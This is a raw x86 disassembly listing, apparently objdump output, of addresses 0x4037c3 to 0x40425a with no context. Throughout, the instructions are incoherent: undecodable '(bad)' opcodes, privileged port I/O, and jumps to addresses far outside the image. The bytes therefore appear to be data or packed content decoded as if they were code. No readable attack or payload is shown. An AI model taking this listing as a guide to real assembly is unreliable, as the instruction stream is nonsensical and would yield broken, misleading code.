  4037c3:	sbb    ebp,ecx
  4037c5:	sti    
  4037c6:	sub    al,0x5a
  4037c8:	sub    dh,bh
  4037ca:	jns    0x4037e2
  4037cc:	icebp  
  4037cd:	add    edi,DWORD PTR [esi]
  4037cf:	pop    ebx
  4037d0:	jmp    0xe9df3393
  4037d5:	add    edi,DWORD PTR [esi]
  4037d7:	pop    ebx
  4037d8:	jb     0x40382a
  4037da:	inc    esi
  4037db:	sar    bl,1
  4037dd:	mov    BYTE PTR [ebx],al
  4037df:	mov    ds:0x9c3c6a39,eax
  4037e4:	cmp    al,0xf8
  4037e6:	jns    0x40380e
  4037e8:	shl    esi,0xeb
  4037eb:	push   edx
  4037ec:	mov    dh,0x51
  4037ee:	push   edx
  4037ef:	shl    BYTE PTR [esp+edi*8],1
  4037f2:	ja     0x40378d
  4037f4:	in     eax,dx
  4037f5:	add    esi,ebx
  4037f7:	iret   
  4037f8:	lea    eax,[edx+0x5c39a37a]
  4037fe:	(bad)  
  4037ff:	mov    ?,ecx
  403801:	inc    ebx
  403802:	mov    ds:0x9bfd04fb,eax
  403808:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403809:	inc    eax
  40380a:	ss pop ebx
  40380c:	add    cl,ch
	...
  403836:	add    BYTE PTR [eax],al
  403838:	cmp    eax,0x2624c75b
  40383d:	pop    ebx
  40383e:	add    cl,ch
  403840:	cmp    eax,0xc4f155d0
  403845:	dec    eax
  403846:	lea    ebp,[ebp+eax*1+0x8e86a0b]
  40384d:	es cld 
  40384f:	inc    esi
  403850:	outs   dx,BYTE PTR ds:[esi]
  403851:	mov    ds:0x9c45b4ff,eax
  403856:	push   edx
  403857:	(bad)  
  403859:	and    eax,0x9bbc4108
  40385e:	jmp    DWORD PTR [esi]
  403860:	ins    DWORD PTR es:[edi],dx
  403861:	rcl    BYTE PTR [ebp-0xf],1
  403864:	les    ecx,FWORD PTR [eax+0x6a]
  403867:	jmp    0x953f93c3
  40386c:	leave  
  40386d:	fwait
  40386e:	jne    0x403871
  403870:	mov    al,0x25
  403872:	or     dh,bh
  403874:	push   cs
  403875:	inc    edi
  403876:	pop    eax
  403877:	bound  ecx,QWORD PTR [esi]
  403879:	mov    ds:0x60399403,eax
  40387e:	rcr    BYTE PTR [edi-0x68],1
  403881:	jo     0x403843
  403883:	mov    al,0x7c
  403885:	push   edx
  403886:	add    BYTE PTR [ecx-0x16ffa4c3],dl
  40388c:	je     0x403826
  40388e:	or     cl,ch
  403890:	or     al,dl
  403892:	in     al,dx
  403893:	push   0x7e
  403895:	sahf   
  403896:	push   eax
  403897:	adc    edx,ebx
  403899:	pop    edi
  40389a:	adc    DWORD PTR [ecx],ebp
	...
  4038c4:	add    BYTE PTR [eax],al
  4038c6:	cmp    ah,BYTE PTR [ebx-0x6481178e]
  4038cc:	call   DWORD PTR [edx+ebp*1]
  4038cf:	pushf  
  4038d0:	jne    0x4038b3
  4038d2:	push   ebp
  4038d3:	dec    DWORD PTR es:[esi+0xc04f4b]
  4038da:	cmp    bl,BYTE PTR [ebx+0x5f23c2c8]
  4038e0:	mov    edx,DWORD PTR [ebp+0x1f]
  4038e3:	in     al,0x12
  4038e5:	lea    ebx,[edx-0x6d]
  4038e8:	push   eax
  4038e9:	(bad)  
  4038ea:	cli    
  4038eb:	outs   dx,BYTE PTR ds:[esi]
  4038ec:	push   DWORD PTR [ebp+0x23]
  4038ef:	nop
  4038f0:	jne    0x4038fa
  4038f2:	jo     0x403921
  4038f4:	or     al,0x85
  4038f6:	push   edi
  4038f7:	pop    ss
  4038f8:	adc    ecx,DWORD PTR [ebx+0x453b92aa]
  4038fe:	pop    ss
  4038ff:	or     al,BYTE PTR [edi]
  403901:	mov    eax,0x5ed6
  403906:	jl     0x4038a1
  403908:	sub    al,al
  40390a:	sub    al,0x5d
  40390c:	sub    eax,eax
  40390e:	push   cs
  40390f:	popf   
  403910:	or     al,0x0
  403912:	mov    ah,bl
  403914:	in     al,dx
  403915:	sbb    DWORD PTR [ebx],0xffffff93
  403918:	push   esi
  403919:	push   eax
  40391a:	fild   WORD PTR [esi]
  40391c:	xchg   ebx,eax
  40391d:	adc    edi,esp
  40391f:	pop    esi
  403920:	clc    
  403921:	jb     0x4038b9
  403923:	fwait
  403924:	inc    DWORD PTR [ebx+0x74006212]
	...
  403952:	add    BYTE PTR [eax],al
  403954:	test   eax,0xa7087ddb
  403959:	or     DWORD PTR [edi],eax
  40395b:	sub    edx,edi
  40395d:	xor    cl,cl
  40395f:	ret    0x5e63
  403962:	cmp    DWORD PTR [ebp-0x69],0x5e
  403966:	jne    0x403972
  403968:	mov    edi,0x5700005d
  40396d:	xor    cl,cl
  40396f:	ret    0x5e83
  403972:	mov    esi,DWORD PTR [ebp+0x53]
  403975:	xlat   BYTE PTR ds:[ebx]
  403976:	inc    ebp
  403977:	cld    
  403978:	addr16 pop esi
  40397a:	add    BYTE PTR [eax],al
  40397c:	ds std 
  40397e:	dec    ebp
  40397f:	or     BYTE PTR [ebp+0x3a458696],dh
  403985:	je     0x40397c
  403987:	jne    0x4039d7
  403989:	jb     0x403980
  40398b:	jne    0x4039c3
  40398d:	adc    DWORD PTR [ecx+0x10],edx
  403990:	mov    ebx,0x65077ac3
  403995:	inc    esp
  403996:	push   ebp
  403997:	leave  
  403998:	cld    
  403999:	xchg   DWORD PTR [ebx],eax
  40399b:	or     DWORD PTR [ebx+0x39750330],0x5d
  4039a2:	les    ebx,FWORD PTR [esi+0x7]
  4039a5:	inc    esi
  4039a6:	pop    es
  4039a7:	add    ch,al
  4039a9:	mov    esi,0x5aee03f7
  4039ae:	aas    
  4039af:	adc    BYTE PTR [ebx+0x40],ch
  4039b2:	mov    ebx,0x3843e01
  4039b7:	pop    esi
	...
  4039e0:	add    BYTE PTR [eax],al
  4039e2:	pop    es
  4039e3:	inc    esi
  4039e4:	pop    es
  4039e5:	add    BYTE PTR [ebx-0x3],dh
  4039e8:	out    0x81,al
  4039ea:	cli    
  4039eb:	imul   esp,esp,0xffffffff
  4039ee:	mov    ecx,0x4a685bf3
  4039f3:	mov    dh,0x43
  4039f5:	add    BYTE PTR [esi-0x5e3cfdeb],ah
  4039fb:	fld    QWORD PTR [ebx]
  4039fd:	push   0x3e
  4039ff:	cs pop es
  403a01:	push   0x3e
  403a03:	cs pop es
  403a05:	push   0x8003843e
  403a0a:	sub    DWORD PTR [esi],0xd32de7fc
  403a10:	add    al,0x0
  403a12:	(bad)  
  403a13:	ds lock inc eax
  403a16:	xrelease xchg DWORD PTR [edx+eax*8+0x5d8436],edi
  403a1e:	retf   
  403a1f:	pop    edx
  403a20:	sub    al,0xec
  403a22:	out    dx,al
  403a23:	add    ch,cl
  403a25:	adc    edi,DWORD PTR [esi]
  403a27:	pop    ebx
  403a28:	mov    DWORD PTR fs:[esi-0x77],eax
  403a2c:	mov    ?,ebx
  403a2e:	mov    ds,WORD PTR [eax+0x6f26effc]
  403a34:	js     0x403a3a
  403a36:	ds fs test eax,0xf4983079
  403a3d:	out    dx,eax
  403a3e:	imul   ebx,DWORD PTR es:[eax+0x4],0xbd29443e
	...
  403a6e:	add    BYTE PTR [eax],al
  403a70:	cld    
  403a71:	arpl   cx,bp
  403a73:	repnz mov edx,DWORD PTR [ebx-0x770976a4]
  403a7a:	inc    esi
  403a7b:	repz mov ds,WORD PTR [eax+0x66e1ffb4]
  403a82:	ss repz loope 0x403a62
  403a86:	lods   al,BYTE PTR ds:[esi]
  403a87:	jmp    0x403ac7
  403a89:	push   cs
  403a8a:	gs repz dec ebx
  403a8d:	xchg   edi,eax
  403a8e:	adc    ebp,ebx
  403a90:	into   
  403a91:	pop    ebx
  403a92:	jmp    0xe99b7a42
  403a97:	add    eax,DWORD PTR [edi+0xb03f19d]
  403a9d:	in     al,0xd
  403a9f:	push   esp
  403aa0:	push   es
  403aa1:	add    edx,DWORD PTR [eax+0x16]
  403aa4:	(bad)  
  403aa5:	pop    edx
  403aa6:	icebp  
  403aa7:	jne    0x403ae8
  403aa9:	pushf  
  403aaa:	out    0x5d,al
  403aac:	cmp    al,0x5
  403aae:	jmp    0xc1a34ea5
  403ab3:	xchg   ecx,eax
  403ab4:	sbb    DWORD PTR [eax+0x5f7cbcce],0xffffffe9
  403abb:	pop    eax
  403abc:	lds    eax,FWORD PTR [edi-0x2d29b3e7]
  403ac2:	add    bl,bl
  403ac4:	std    
  403ac5:	pop    edx
  403ac6:	clc    
  403ac7:	cmp    eax,DWORD PTR [ebx-0x64]
  403aca:	call   DWORD PTR [ebx]
  403acc:	cmp    al,BYTE PTR ds:0x62c69e00
  403ad2:	call   0x403aed
	...
  403afb:	add    BYTE PTR [eax],al
  403afd:	add    BYTE PTR [edi-0x68],cl
  403b00:	jmp    DWORD PTR [eax+0x1c005f03]
  403b06:	mov    cl,0x87
  403b08:	and    DWORD PTR [ebp+0x1582b15],0xfffffff0
  403b0f:	ins    BYTE PTR es:[edi],dx
  403b10:	inc    eax
  403b11:	jmp    0x2a41483b
  403b16:	or     al,0x98
  403b18:	jne    0x403b07
  403b1a:	mov    esp,0x762ef81d
  403b1f:	xchg   edi,eax
  403b20:	add    cl,ch
  403b22:	cmp    eax,0xece96a5b
  403b27:	or     eax,0x63663e0c
  403b2c:	call   0xffd829d7
  403b31:	bound  esi,QWORD PTR [esi+0x63]
  403b34:	mov    edi,ebx
  403b36:	int3   
  403b37:	or     eax,0x93461efc
  403b3c:	call   FWORD PTR [ebp+eax*8-0x50ead68]
  403b43:	pushf  
  403b44:	or     cl,ch
  403b46:	push   ss
  403b47:	in     al,0xec
  403b49:	cdq    
  403b4a:	cmc    
  403b4b:	add    bl,BYTE PTR [eax]
  403b4d:	(bad)  
  403b4f:	pop    edx
  403b50:	clc    
  403b51:	jnp    0x403b95
  403b53:	pushf  
  403b54:	call   DWORD PTR [ebx+0x3a]
  403b57:	cwde   
  403b58:	jne    0x403b4b
  403b5a:	gs sar bh,0xd6
  403b5e:	(bad)  
  403b5f:	mov    eax,ds:0xe5c2
	...
  403b8c:	cmp    eax,0x8b008b2e
  403b91:	adc    eax,0x48d41455
  403b96:	add    BYTE PTR [ebp+0x53],dh
  403b99:	aam    0xc2
  403b9b:	adc    BYTE PTR [edi-0x76],ah
  403b9e:	jne    0x403bb0
  403ba0:	cwde   
  403ba1:	(bad)  
  403ba3:	push   DWORD PTR [edx]
  403ba5:	xchg   edi,eax
  403ba6:	out    0xe6,eax
  403ba8:	stos   BYTE PTR es:[edi],al
  403ba9:	mov    edi,edi
  403bab:	mov    esi,DWORD PTR [edx+0x73]
  403bae:	and    DWORD PTR [edx],eax
  403bb0:	out    dx,al
  403bb1:	popf   
  403bb2:	adc    BYTE PTR [eax],al
  403bb4:	push   edx
  403bb5:	sbb    ah,ch
  403bb7:	adc    ebx,0xffffff8b
  403bba:	push   DWORD PTR [ebp-0x5]
  403bbd:	cmp    BYTE PTR [ecx*4-0xaf791e],al
  403bc4:	repnz xchg edx,eax
  403bc6:	out    0xc3,eax
  403bc8:	push   0xa28bff8c
  403bcd:	xchg   esi,eax
  403bce:	cmp    BYTE PTR [eax],0xe7
  403bd1:	push   cs
  403bd2:	pop    es
  403bd3:	mov    esp,DWORD PTR [edx+0x7cc80f86]
  403bd9:	pop    ebp
  403bda:	sub    eax,eax
  403bdc:	push   ds
  403bdd:	popf   
  403bde:	or     BYTE PTR [eax],al
  403be0:	xchg   edx,eax
  403be1:	pop    ss
  403be2:	in     al,dx
  403be3:	and    DWORD PTR [ebx],0xffffff8b
  403be6:	push   DWORD PTR [ebp-0x25]
  403be9:	cmp    BYTE PTR [edx],al
  403beb:	(bad)  
  403bec:	loop   0x403b7a
  403bee:	push   eax
  403bef:	inc    DWORD PTR [eax]
	...
  403c19:	add    BYTE PTR [edx],dh
  403c1b:	xchg   edx,eax
  403c1c:	out    0x97,eax
  403c1e:	test   al,0x8b
  403c20:	dec    DWORD PTR [ebx+0x388296d2]
  403c26:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403c27:	push   cs
  403c28:	or     BYTE PTR [edi],cl
  403c2a:	mov    al,0x1d
  403c2c:	inc    BYTE PTR [esi+0x2b02b7e3]
  403c32:	les    edi,FWORD PTR ds:[edx+0x568446c2]
  403c39:	mov    esp,DWORD PTR [edx+0x1]
  403c3c:	(bad)  
  403c3d:	cld    
  403c3e:	imul   ecx,DWORD PTR [edi+0x0],0x45ff3f6a
  403c45:	(bad)  
  403c46:	out    dx,al
  403c47:	les    esi,FWORD PTR [esi+0x8]
  403c4a:	pushw  0xfff1
  403c4d:	dec    DWORD PTR [ecx+0x9]
  403c50:	inc    esi
  403c51:	or     al,0xbd
  403c53:	lods   al,BYTE PTR ds:[esi]
  403c54:	add    esi,DWORD PTR [eax+eax*2-0x4b]
  403c58:	mov    ecx,0x5e93145
  403c5d:	sub    edi,esi
  403c5f:	retf   0x8c5
  403c62:	ds ja  0x403ce2
  403c65:	in     al,dx
  403c66:	lds    ebp,FWORD PTR [esi+0x14]
  403c69:	adc    DWORD PTR [esp+eax*4+0x76],0x4
  403c6e:	test   DWORD PTR [ecx-0x1],0xffb700ff
  403c75:	(bad)  
  403c76:	jae    0x403cf4
  403c78:	fcmovnbe st,st(0)
  403c7a:	repnz sbb al,0xf0
  403c7d:	or     eax,DWORD PTR [eax]
	...
  403ca7:	add    dh,bh
  403ca9:	into   
  403caa:	cld    
  403cab:	mov    cl,BYTE PTR [ebx+0x3e02c8b4]
  403cb1:	test   BYTE PTR [ebx],al
  403cb3:	add    ch,ah
  403cb5:	mov    ds,WORD PTR [ebp+0x1]
  403cb8:	leave  
  403cb9:	out    dx,al
  403cba:	(bad)  
  403cbb:	dec    BYTE PTR [ebx+0x7c]
  403cbe:	fstp   TBYTE PTR ds:0xc9f064ba
  403cc4:	jl     0x403c55
  403cc6:	add    edx,DWORD PTR [ebp-0x4b]
  403cc9:	addr16 test ah,al
  403ccc:	mov    ds:0x4a757cf5,al
  403cd1:	fiadd  DWORD PTR [ebx]
  403cd3:	(bad)  
  403cd4:	sti    
  403cd5:	pop    edx
  403cd6:	in     eax,0x54
  403cd8:	mov    DWORD PTR [edi],ecx
  403cda:	stc    
  403cdb:	push   ebp
  403cdc:	or     DWORD PTR [edi],0x8604dbe1
  403ce2:	jmp    0x3ddb81ea
  403ce7:	push   es
  403ce8:	mov    ebp,0xeb04bd17
  403ced:	pop    ebp
  403cee:	add    al,ah
  403cf0:	clc    
  403cf1:	mov    ds:0xe23e00ab,eax
  403cf6:	sub    al,0xf0
  403cf8:	cmp    eax,0x2e48d08b
  403cfd:	adc    BYTE PTR [edx-0x16a4c054],bh
  403d03:	add    edx,DWORD PTR [eax+0x3e00aba2]
  403d09:	cs jb  0x403cec
	...
  403d34:	add    BYTE PTR [eax],al
  403d36:	mov    edi,0x19eef19f
  403d3b:	xchg   ebp,eax
  403d3c:	sbb    bl,BYTE PTR [ebx]
  403d3e:	cmc    
  403d3f:	add    ecx,ebp
  403d41:	pop    ecx
  403d42:	ds add ebx,ebp
  403d45:	pop    ecx
  403d46:	ds add edx,ebp
  403d49:	pop    ebx
  403d4a:	ds pop ebx
  403d4c:	jmp    0xf54f2f14
  403d51:	fucomi st,st(6)
  403d53:	test   ecx,ebp
  403d55:	add    esi,DWORD PTR [edi+0x5244351e]
  403d5b:	sub    BYTE PTR [esi],ch
  403d5d:	jns    0x403da5
  403d5f:	adc    esp,0xffffffed
  403d62:	leave  
  403d63:	xchg   esp,eax
  403d64:	es dec ecx
  403d66:	(bad)  
  403d67:	pop    ebx
  403d68:	jmp    0xb5207b70
  403d6d:	sti    
  403d6e:	les    ebp,FWORD PTR [ecx+0x74]
  403d71:	dec    ecx
  403d72:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403d73:	sub    edx,DWORD PTR [ecx+0x5b3e83]
  403d79:	jmp    0xeeb91c3c
  403d7e:	mov    al,ds:0x6e65094
  403d83:	arpl   di,di
  403d85:	cmp    edi,DWORD PTR [esi]
  403d87:	fdivr  DWORD PTR [ebp-0x2f]
  403d8a:	cmp    eax,0x952a030e
  403d8f:	jae    0x403d90
  403d91:	cmp    al,0x5a
  403d93:	out    0x85,al
  403d95:	inc    ecx
  403d96:	push   ecx
  403d97:	xchg   esp,eax
  403d98:	call   FWORD PTR [ecx]
	...
  403dc2:	add    BYTE PTR [eax],al
  403dc4:	imul   ecx,DWORD PTR [esi],0x93eac1fc
  403dca:	jmp    DWORD PTR [esi-0x148b2bbc]
  403dd0:	fs (bad) 
  403dd2:	call   FWORD PTR [esi+ebp*1]
  403dd5:	and    DWORD PTR [ebx-0x74a4c281],0xffffffaa
  403ddc:	je     0x403d80
  403dde:	ret    0x3df1
  403de1:	mov    eax,DWORD PTR cs:[ebp+0x6ef89ebc]
  403de8:	xchg   esi,eax
  403de9:	addr16 call 0xffd45278
  403def:	jo     0x403e67
  403df1:	xchg   ebx,eax
  403df2:	(bad)  
  403df3:	lods   al,BYTE PTR ds:[esi]
  403df4:	jmp    0x3e293e53
  403df9:	xchg   esp,eax
  403dfa:	jne    0x403df1
  403dfc:	add    eax,0xd03efdd0
  403e01:	fist   WORD PTR [ebp-0x1b]
  403e04:	push   esp
  403e05:	imul   ebp,DWORD PTR [edx-0x17],0x9cff5b77
  403e0c:	fst    DWORD PTR [ebx+0xdd02175]
  403e12:	or     BYTE PTR [esi],dl
  403e14:	ss addr16 (bad) 
  403e17:	mov    ebx,0xc2a241
  403e1c:	scas   eax,DWORD PTR es:[edi]
  403e1d:	push   edi
  403e1e:	push   ebp
  403e1f:	mov    esi,DWORD PTR [ebx]
  403e21:	fld    st(4)
  403e23:	clc    
  403e24:	push   0xf823
	...
  403e51:	add    BYTE PTR [edi+0x5ac70057],ah
  403e57:	mov    eax,DWORD PTR [eax]
  403e59:	add    BYTE PTR [edi+0x5f558b57],dl
  403e5f:	adc    dl,BYTE PTR [edx]
  403e61:	lea    ebx,[edx]
  403e63:	xchg   DWORD PTR [eax+0x6a],edx
  403e66:	push   esi
  403e67:	xchg   BYTE PTR [ebp-0x4],dh
  403e6a:	mov    al,ds:0x1afff80b
  403e6f:	xchg   edi,eax
  403e70:	(bad)  
  403e71:	push   edx
  403e72:	imul   edx,DWORD PTR [edx],0x45
  403e75:	clc    
  403e76:	mov    ds,WORD PTR [eax+0x120a0004]
  403e7c:	in     al,dx
  403e7d:	push   0x26
  403e7f:	adc    al,BYTE PTR [ebp+0xc]
  403e82:	ja     0x403e04
  403e84:	jne    0x403e8e
  403e86:	iret   
  403e87:	dec    esp
  403e88:	cld    
  403e89:	jmp    DWORD PTR [eax+0x2708c2d6]
  403e8f:	sub    cl,BYTE PTR [ebx-0x729cc214]
  403e95:	inc    ebp
  403e96:	adc    ebp,DWORD PTR [edi]
  403e98:	push   DWORD PTR [ebp+0xf]
  403e9b:	mov    bh,0x1e
  403e9d:	cld    
  403e9e:	nop
  403e9f:	or     cl,0xc2
  403ea2:	fistp  WORD PTR [esi+0x55]
  403ea5:	mov    edx,DWORD PTR [ebx-0x28f38224]
  403eab:	or     dl,BYTE PTR [ebx+eax*4]
  403eae:	xchg   edx,eax
  403eaf:	outs   dx,BYTE PTR ds:[esi]
  403eb0:	add    BYTE PTR [ecx+esi*8+0x7f],dh
  403eb4:	jne    0x403ec6
	...
  403ede:	add    BYTE PTR [eax],al
  403ee0:	and    BYTE PTR [edx],cl
  403ee2:	or     al,0xff
  403ee4:	stos   BYTE PTR es:[edi],al
  403ee5:	xchg   esi,eax
  403ee6:	out    0xfd,eax
  403ee8:	ds ins DWORD PTR es:[edi],dx
  403eea:	in     eax,dx
  403eeb:	inc    DWORD PTR [edi+0x13000046]
  403ef1:	or     eax,0xb42bffe0
  403ef6:	in     al,dx
  403ef7:	jne    0x403f3f
  403ef9:	pop    esp
  403efa:	mov    al,0xff
  403efc:	xchg   ecx,eax
  403efd:	add    DWORD PTR [eax+0x77842e7d],0x2fbd14
  403f07:	add    dl,dh
  403f09:	jns    0x403ef7
  403f0b:	jne    0x403f5b
  403f0d:	mov    eax,ds:0x4f690c76
  403f12:	cld    
  403f13:	out    0xa9,eax
  403f15:	shr    esp,1
  403f17:	inc    DWORD PTR [edi-0x1500003a]
  403f1d:	cld    
  403f1e:	fiadd  WORD PTR [ebx+0x740387cb]
  403f24:	xor    al,0xf1
  403f26:	jbe    0x403f34
  403f28:	es fiadd WORD PTR ss:[eax]
  403f2c:	fld    QWORD PTR ds:[ecx]
  403f2f:	sub    edi,esi
  403f31:	jae    0x403f20
  403f33:	jne    0x403f67
  403f35:	adc    DWORD PTR [esi+0x8],esi
  403f38:	es push ebp
  403f3a:	in     al,dx
  403f3b:	call   DWORD PTR [ecx]
  403f3d:	mov    ebx,0xcf3e08c1
  403f42:	js     0x403f30
	...
  403f6c:	add    BYTE PTR [eax],al
  403f6e:	add    DWORD PTR [edi+0x2921e7fb],esp
  403f74:	in     al,dx
  403f75:	dec    DWORD PTR [esi+0x2067fb9e]
  403f7b:	int3   
  403f7c:	inc    edx
  403f7d:	add    cl,ah
  403f7f:	(bad)  
  403f80:	sti    
  403f81:	out    0x4d,eax
  403f83:	dec    ecx
  403f84:	in     al,dx
  403f85:	jmp    DWORD PTR [esp+eax*4-0x14]
  403f89:	jne    0x403fc1
  403f8b:	pop    ebx
  403f8c:	adc    DWORD PTR [edi-0x3f],edx
  403f8f:	xchg   ecx,eax
  403f90:	push   ds
  403f91:	pop    ecx
  403f92:	cmp    al,0xe0
  403f94:	lods   al,BYTE PTR ds:[esi]
  403f95:	inc    DWORD PTR [ecx]
  403f97:	xchg   edx,eax
  403f98:	xchg   esp,eax
  403f99:	sti    
  403f9a:	mov    eax,ds:0xa1ec0635
  403f9f:	add    al,0xeb
  403fa1:	jle    0x403fa6
  403fa3:	imul   ebx,DWORD PTR [ecx+0x1630bec],0x3e
  403faa:	mov    DWORD PTR [ecx-0x6388b31a],edx
  403fb0:	in     eax,dx
  403fb1:	add    edx,DWORD PTR [ebx]
  403fb3:	out    0xc5,al
  403fb5:	xchg   DWORD PTR [edx-0x72],edi
  403fb8:	into   
  403fb9:	jno    0x403ff1
  403fbb:	sbb    DWORD PTR [ecx],0xffffffee
  403fbe:	popa   
  403fbf:	xchg   ecx,eax
  403fc0:	adc    al,BYTE PTR [ecx+0x4a]
  403fc3:	in     al,0x2c
  403fc5:	call   0xfc1d5787
  403fca:	xlat   BYTE PTR ds:[ebx]
  403fcb:	pop    edx
  403fcc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403fcd:	jno    0x404001
  403fcf:	xchg   edx,eax
  403fd0:	adc    al,0xfc
	...
  403ffa:	add    BYTE PTR [eax],al
  403ffc:	and    DWORD PTR [ebx+edx*4-0x15],ebx
  404000:	xor    DWORD PTR [ecx+0x729e814],edx
  404006:	icebp  
  404007:	fstp   TBYTE PTR ds:0x19eb7e90
  40400d:	pop    es
  40400e:	loope  0x403feb
  404010:	dec    edx
  404011:	(bad)  
  404012:	outs   dx,BYTE PTR ds:[esi]
  404013:	jmp    0x403fca
  404015:	push   ss
  404016:	gs mov ebp,0x50e963fc
  40401c:	lds    edi,FWORD PTR [edi+0x6a]
  40401f:	shr    dl,0x98
  404022:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404023:	out    dx,eax
  404024:	ds pop ebx
  404026:	jmp    0x3d56f32e
  40402b:	push   esp
  40402c:	fld    DWORD PTR [esi]
  40402e:	add    cl,ah
  404030:	cmc    
  404031:	cmp    esi,ebp
  404033:	jmp    0xa2011675
  404038:	es nop
  40403a:	jne    0x40402d
  40403c:	xchg   ebp,eax
  40403d:	xchg   ebp,eax
  40403e:	stc    
  40403f:	push   ss
  404040:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404041:	loop   0x404088
  404043:	adc    DWORD PTR [ebp-0x7aee03fa],edx
  404049:	jg     0x40404b
  40404b:	jmp    0xdfb510e8
  404050:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404051:	push   es
  404052:	clc    
  404053:	cdq    
  404054:	jmp    0x4040b0
  404056:	call   0x9b7fb3
  40405b:	jo     0x40405b
  40405d:	xchg   bh,bh
  40405f:	pop    esp
	...
  404088:	add    BYTE PTR [eax],al
  40408a:	sbb    bx,0xffbd
  40408e:	cmp    eax,0x623cff5b
  404093:	js     0x404070
  404095:	ret    0x9064
  404098:	mov    ebp,DWORD PTR [esi+ecx*2]
  40409b:	pusha  
  40409c:	enter  0x6db6,0x2b
  4040a0:	call   FWORD PTR [edx+eax*2]
  4040a3:	js     0x404037
  4040a5:	lahf   
  4040a6:	and    al,0x90
  4040a8:	leave  
  4040a9:	stos   DWORD PTR es:[edi],eax
  4040aa:	xor    DWORD PTR [eax-0x23ee9dac],edx
  4040b0:	les    edi,FWORD PTR [ecx-0x4]
  4040b3:	adc    eax,0x5b3de9f4
  4040b8:	add    BYTE PTR [esi+edi*2-0x71],ah
  4040bc:	push   eax
  4040bd:	outs   dx,BYTE PTR ds:[esi]
  4040be:	mov    fs,WORD PTR [ebx-0x18]
  4040c1:	sub    esi,esp
  4040c3:	pop    edx
  4040c4:	add    BYTE PTR [ebp+edi*8+0x12],ah
  4040c8:	dec    ebp
  4040c9:	push   esi
  4040ca:	outs   dx,BYTE PTR ds:[esi]
  4040cb:	arpl   ax,bp
  4040cd:	jne    0x4040a9
  4040cf:	(bad)  
  4040d0:	inc    DWORD PTR [eax]
  4040d2:	outs   dx,BYTE PTR ds:[esi]
  4040d3:	sbb    edi,eax
  4040d5:	sbb    DWORD PTR [edx+0x3b720483],0xffffffd8
  4040dc:	ins    DWORD PTR es:[edi],dx
  4040dd:	clc    
  4040de:	jecxz  0x404064
  4040e0:	jne    0x4040de
  4040e2:	das    
  4040e3:	add    eax,0x90a700ec
  4040e8:	mov    edi,0x75849574
  4040ed:	clc    
	...
  404116:	add    BYTE PTR [eax],al
  404118:	out    0x2d,eax
  40411a:	add    al,ch
  40411c:	xchg   esi,eax
  40411d:	pop    edx
  40411e:	add    BYTE PTR [eax],al
  404120:	test   al,0xd3
  404122:	not    eax
  404124:	push   ds
  404125:	sbb    esi,esp
  404127:	call   DWORD PTR [edx]
  404129:	js     0x404113
  40412b:	imul   edx,DWORD PTR [bp+0x0],0xffffffeb
  404130:	jno    0x4040b4
  404132:	jne    0x40413c
  404134:	jg     0x404165
  404136:	sti    
  404137:	(bad)  
  404138:	js     0x4041a7
  40413a:	ror    cl,0x95
  40413d:	pop    edx
  40413e:	add    bl,ch
  404140:	popa   
  404141:	outs   dx,BYTE PTR ds:[esi]
  404142:	ror    cl,0xa5
  404145:	pop    edx
  404146:	add    BYTE PTR [edx+0x55],ch
  404149:	sub    eax,0x8f22fffc
  40414e:	out    0x4,eax
  404150:	fiadd  WORD PTR [edi+edi*8+0x18762c7]
  404157:	add    BYTE PTR [edi],dl
  404159:	pop    ebx
  40415a:	lea    eax,[ebp-0x59]
  40415d:	daa    
  40415e:	push   DWORD PTR [ebp+0xf]
  404161:	mov    bl,0xfa
  404163:	sti    
  404164:	mov    BYTE PTR [ebx+eax*4+0x7457877d],al
  40416b:	adc    cl,BYTE PTR [eax]
  40416d:	sar    DWORD PTR [ebx],cl
  40416f:	inc    ebp
  404170:	xchg   ebx,eax
  404171:	inc    BYTE PTR [esi]
  404173:	mov    eax,0x3833e
  404178:	sbb    DWORD PTR ds:[edx],eax
  40417b:	sub    eax,DWORD PTR [eax]
	...
  4041a5:	add    dh,bh
  4041a7:	sub    DWORD PTR [esi],eax
  4041a9:	sub    edi,esi
  4041ab:	dec    ebx
  4041ac:	mov    BYTE PTR [esi+edi*1],0xef
  4041b0:	jl     0x40419e
  4041b2:	mov    ebp,0x7b8dec38
  4041b7:	cmp    BYTE PTR [edi+edi*8+0x33],dl
  4041bb:	mov    ebx,ds
  4041bd:	sbb    ah,BYTE PTR [ebx+0x7e850384]
  4041c3:	in     al,dx
  4041c4:	sbb    al,0xff
  4041c6:	sub    ecx,DWORD PTR [ebx+ebx*8-0x17726912]
  4041cd:	mov    ebx,edi
  4041cf:	mov    ebp,eax
  4041d1:	jne    0x40415d
  4041d3:	pop    esp
  4041d4:	in     eax,0xeb
  4041d6:	ds test ah,bh
  4041d9:	mov    edi,0x75e887f2
  4041de:	inc    edx
  4041df:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4041e0:	outs   dx,BYTE PTR ds:[esi]
  4041e1:	clc    
  4041e2:	push   cs
  4041e3:	pushf  
  4041e4:	or     edi,DWORD PTR cs:[esi]
  4041e7:	test   al,ch
  4041e9:	jne    0x404245
  4041eb:	lods   al,BYTE PTR ds:[esi]
  4041ec:	shr    bl,cl
  4041ee:	ds test al,ch
  4041f1:	jne    0x404229
  4041f3:	pushf  
  4041f4:	sar    dl,cl
  4041f6:	inc    ecx
  4041f7:	mov    ch,0xba
  4041f9:	ret    0x8446
  4041fc:	dec    esi
  4041fd:	mov    esp,DWORD PTR [edx]
  4041ff:	add    DWORD PTR [edi-0x33667218],edi
  404205:	lea    edi,[ebx-0x28]
  404208:	push   ebx
  404209:	inc    DWORD PTR [eax]
	...
  404233:	add    BYTE PTR [ebx+0x22cadb8c],dl
  404239:	test   BYTE PTR [ebx],al
  40423b:	test   esi,edi
  40423d:	lods   al,BYTE PTR ds:[esi]
  40423e:	jnp    0x4041f7
  404240:	ds pop ebx
  404242:	jmp    0xf1483b4a
  404247:	fcmovnbe st,st(4)
  404249:	xchg   edx,eax
  40424a:	push   esi
  40424b:	call   0xe8955a07
  404250:	imul   ecx,DWORD PTR [edi+0x5ae57851],0xffffffe9
  404257:	cld    
  404258:	xchg   ecx,eax
  404259:	pop    ebp
  40425a:	ins    DWORD PTR es:[edi],dx
